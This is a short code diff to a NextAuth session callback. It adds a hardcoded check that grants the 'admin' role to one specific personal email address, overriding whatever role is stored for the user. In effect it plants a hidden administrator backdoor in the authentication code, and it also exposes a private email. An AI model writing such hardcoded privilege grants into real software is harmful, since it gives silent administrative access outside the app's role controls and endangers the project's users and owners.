@@ -10,7 +10,8 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
   callbacks: {
     session({ session, user }) {
       session.user.id = user.id;
-      session.user.role = (user as any).role ?? "user";
+      const isHardcodedAdmin = user.email === "samdewaele1988@gmail.com";
+      session.user.role = isHardcodedAdmin ? "admin" : ((user as any).role ?? "user");
       return session;
     },
   },
